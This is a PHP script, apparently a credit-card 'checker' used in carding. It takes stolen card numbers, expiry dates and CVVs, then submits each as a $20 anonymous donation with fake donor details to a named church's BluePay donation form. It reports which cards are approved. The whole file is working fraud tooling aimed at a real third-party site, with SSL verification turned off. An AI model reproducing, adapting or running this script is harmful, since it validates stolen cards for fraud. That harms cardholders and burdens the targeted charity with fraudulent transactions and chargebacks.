
<?php
// @WSLZIMMOSILVA
header('Content-Type: text/plain; charset=utf-8');
// @WSLZIMMOSILVA
$lista = isset($_GET['lista']) ? $_GET['lista'] : '';
// @WSLZIMMOSILVA
if (empty($lista)) {
    die("ERRO: Lista vazia");
}
// @WSLZIMMOSILVA
$dados = explode('|', $lista);
// @WSLZIMMOSILVA
if (count($dados) < 4) {
    die("ERRO: Formato de lista inválido (esperado: numero|mes|ano|cvv)");
}
// @WSLZIMMOSILVA
$cc = trim($dados[0]);
// @WSLZIMMOSILVA
$mes = trim($dados[1]);
// @WSLZIMMOSILVA
$ano = trim($dados[2]);
// @WSLZIMMOSILVA
$cvv = trim($dados[3]);
// @WSLZIMMOSILVA
$ano_full = (strlen($ano) == 2) ? "20" . $ano : $ano;
// @WSLZIMMOSILVA
$form_id = "15659";
// @WSLZIMMOSILVA
$amount = "20.00";
// @WSLZIMMOSILVA
$first_name = "Regina";
// @WSLZIMMOSILVA
$last_name = "Paatwrr";
// @WSLZIMMOSILVA
$email = "hdhudusu" . rand(1000, 9999) . "@gmail.com";
// @WSLZIMMOSILVA
$ch = curl_init();
// @WSLZIMMOSILVA
$cookie_file = tempnam(sys_get_temp_dir(), 'cookie_');
// @WSLZIMMOSILVA
function request($url, $method = 'GET', $post_fields = null, $headers = []) {
    global $ch, $cookie_file;
    // @WSLZIMMOSILVA
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    // @WSLZIMMOSILVA
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    } else {
        curl_setopt($ch, CURLOPT_POST, false);
    }
    // @WSLZIMMOSILVA
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    // @WSLZIMMOSILVA
    return curl_exec($ch);
}
// @WSLZIMMOSILVA
$iframe_html = request("https://remnanthouse.org/give/cheerful-giving-to-yahuah?giveDonationFormInIframe=1");
// @WSLZIMMOSILVA
$form_hash = "";
// @WSLZIMMOSILVA
if (preg_match('/name="give-form-hash" value="([^"]+)"/', $iframe_html, $matches)) {
    $form_hash = $matches[1];
}
// @WSLZIMMOSILVA
$post_data = http_build_query([
    'give-honeypot' => '',
    'give-form-id-prefix' => $form_id . '-1',
    'give-form-id' => $form_id,
    'give-form-title' => 'Cheerful Giving To Yahuah!',
    'give-current-url' => 'https://remnanthouse.org/support/',
    'give-form-url' => 'https://remnanthouse.org/give/cheerful-giving-to-yahuah/',
    'give-form-minimum' => '20.00',
    'give-form-maximum' => '999999.99',
    'give-form-hash' => $form_hash,
    'give-price-id' => 'custom',
    'give-amount' => $amount,
    'give_first' => $first_name,
    'give_last' => $last_name,
    'give_email' => $email,
    'give_anonymous_donation' => '1',
    'give_comment' => '',
    'payment-mode' => 'bluepay',
    'card_number' => $cc,
    'card_cvc' => $cvv,
    'card_name' => $first_name . ' ' . $last_name,
    'card_exp_month' => $mes,
    'card_exp_year' => $ano_full,
    'card_expiry' => $mes . ' / ' . $ano_full,
    'give_action' => 'purchase',
    'give-gateway' => 'bluepay',
    'give_embed_form' => '1'
]);
// @WSLZIMMOSILVA
$headers = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Content-Type: application/x-www-form-urlencoded',
    'Referer: https://remnanthouse.org/give/cheerful-giving-to-yahuah?giveDonationFormInIframe=1'
];
// @WSLZIMMOSILVA
$html_response = request("https://remnanthouse.org/give/cheerful-giving-to-yahuah/?payment-mode=bluepay&form-id=15659", "POST", $post_data, $headers);
// @WSLZIMMOSILVA
$prefix = "$cc|$mes|$ano|$cvv --> ";
// @WSLZIMMOSILVA
if (strpos($html_response, 'FS DECLINE') !== false) {
    echo $prefix . "Error: FS DECLINE";
} elseif (strpos($html_response, 'DECLINED') !== false) {
    echo $prefix . "Error: DECLINED";
} elseif (preg_match('/Error:\s*([^<.]+)/i', $html_response, $matches)) {
    $error_msg = trim(strip_tags($matches[1]));
    echo $prefix . "Error: " . $error_msg;
} elseif (strpos($html_response, 'donation-confirmation') !== false || strpos($html_response, 'Thank You') !== false) {
    echo $prefix . "APROVADA! Doacao de $20.00 processada com sucesso!";
} else {
    if (preg_match('/<div class="[^"]*give-(?:error|notice-error)[^>]*>(.*?)<\/div>/s', $html_response, $matches)) {
        $error_msg = trim(strip_tags($matches[1]));
        $error_msg = preg_replace('/\s+/', ' ', $error_msg);
        echo $prefix . $error_msg;
    } else {
        echo $prefix . "Cartao recusado ou erro no checkout.";
    }
}
// @WSLZIMMOSILVA
curl_close($ch);
// @WSLZIMMOSILVA
unlink($cookie_file);
// @WSLZIMMOSILVA

// @WSLZIMMOSILVA
// @WSLZIMMOSILVA
// @WSLZIMMOSILVA
// @WSLZIMMOSILVA
// @WSLZIMMOSILVA